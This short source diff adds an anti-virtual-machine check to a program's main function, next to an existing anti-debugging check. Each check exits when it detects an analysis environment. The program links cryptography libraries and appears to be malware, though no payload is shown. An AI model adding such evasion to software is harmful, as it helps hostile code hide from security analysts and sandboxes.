@@ -20,7 +20,9 @@
 #include "config.h"
 #include "goop.h"
 #include "misc.h"
+
 #include "antidebug.h"
+#include "antivm.h"
 
 #pragma comment(lib, "Crypt32")
 #pragma comment(lib, "Bcrypt.lib")
@@ -32,6 +34,12 @@ int main()
 	AntiDebug adbg;
 	if (adbg.GetDetected())
 		goto EXIT;
+
+	{
+		AntiVM avm;
+		if (avm.GetDetected())
+			goto EXIT;
+	}
 
 	{
 		Goop goop;
